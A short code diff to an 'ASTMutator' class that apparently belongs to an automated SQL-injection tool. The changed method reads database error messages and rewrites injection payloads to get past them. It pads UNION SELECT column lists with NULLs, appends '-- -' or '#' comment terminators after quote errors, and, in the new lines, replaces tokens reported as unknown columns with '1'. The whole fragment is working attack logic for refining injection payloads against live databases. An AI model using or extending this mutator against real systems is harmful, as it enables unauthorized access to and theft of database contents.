@@ -142,9 +142,9 @@ class ASTMutator:
 
     def _apply_error_feedback(self, payload, error):
         """Applies specific mutations based on SQL error messages."""
-        error = error.lower()
+        error_lower = error.lower()
         # Column count mismatch
-        if "column" in error and ("count" in error or "match" in error):
+        if "column" in error_lower and ("count" in error_lower or "match" in error_lower):
             if "UNION SELECT" in payload.upper():
                 # Add more columns to UNION
                 parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
@@ -153,8 +153,15 @@ class ASTMutator:
                     cols.append("NULL")
                     return f"{parts[0]}{parts[1]}{','.join(cols)}"
         
+        # Unknown Column (caused by unquoted strings like admin parsed as column)
+        unknown_match = re.search(r"unknown column '([^']+)'", error_lower)
+        if unknown_match:
+            problem_token = unknown_match.group(1)
+            # Replace the specific incorrectly parsed unquoted string with a numeric '1'
+            return re.sub(rf'\b{re.escape(problem_token)}\b', "1", payload, flags=re.IGNORECASE)
+
         # Quote mismatch or syntax error near quote
-        if "syntax" in error and ("'" in error or '"' in error):
+        if "syntax" in error_lower and ("'" in error_lower or '"' in error_lower):
             if "'" in payload and not payload.endswith("-- -"): 
                 return payload + "-- -"
             if '"' in payload and not payload.endswith("#"):
